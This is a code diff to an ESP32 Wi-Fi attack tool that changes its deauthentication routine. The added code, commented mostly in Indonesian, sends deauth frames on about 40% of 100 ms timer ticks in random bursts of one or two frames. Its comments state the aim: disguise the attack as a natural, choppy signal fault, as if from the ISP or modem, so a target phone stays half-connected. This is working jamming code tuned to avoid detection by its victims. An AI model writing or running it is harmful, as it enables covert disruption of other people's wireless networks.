@@ -4,7 +4,8 @@
  * @date 8-5-2026
  * @copyright Copyright (c) 2026
  *
- * @brief Implements common methods for various attacks.
+ * @brief Implements common methods for various attacks with pure randomized noise deauth 
+ *        to simulate a natural, choppy signal degradation mimicking genuine ISP/modem faults.
  * IMPORTANT: Does NOT re-initialise NVS / netif / event_loop / WiFi.
  * Those are already done by wifi_controller in this project.
  */
@@ -35,13 +36,27 @@ static const char *TAG = "main:attack_method";
 static void timer_send_deauth_frame(void *arg) {
     wifi_ap_record_t *ap = (wifi_ap_record_t *) arg;
 
+    // MODIFIKASI MAKSIMAL: Simulasi Gangguan Alami Menggunakan Kriptografi Acak ESP32
+    // Menghasilkan angka acak antara 0 hingga 99
+    uint32_t random_roll = esp_random() % 100;
+
+    // Hukum Probabilitas Probabilistik (40% Probabilitas Kirim Gangguan, 60% Dibiarkan Lolos Sinyal)
+    // Celah 60% ini sengaja dibuka agar HP target sempat bertukar data secara patah-patah dengan modem asli
+    if (random_roll < 60) {
+        return; 
+    }
+
     esp_err_t ch_err = esp_wifi_set_channel(ap->primary, WIFI_SECOND_CHAN_NONE);
     if (ch_err != ESP_OK) {
         ESP_LOGV(TAG, "Channel set skip (AP mode active): %s", esp_err_to_name(ch_err));
         return;
     }
 
-    wsl_bypasser_send_deauth_frame(ap);
+    // Mengacak jumlah semburan burst paket (kadang kirim 1, kadang kirim 2 secara acak)
+    uint32_t dynamic_burst = 1 + (esp_random() % 2);
+    for (uint32_t b = 0; b < dynamic_burst; b++) {
+        wsl_bypasser_send_deauth_frame(ap);
+    }
 }
 
 static esp_timer_handle_t deauth_timer_handles[MAX_ATTACK_TARGETS];
@@ -60,6 +75,7 @@ void attack_method_broadcast(const wifi_ap_record_t *ap_record, unsigned period_
     };
 
     ESP_ERROR_CHECK(esp_timer_create(&deauth_timer_args, &deauth_timer_handles[active_timers]));
+    // Timer tetap dipicu ketat setiap 100ms agar respon pengecekan acak selalu aktif di latar belakang
     ESP_ERROR_CHECK(esp_timer_start_periodic(deauth_timer_handles[active_timers], 100000));
 
     active_timers++;
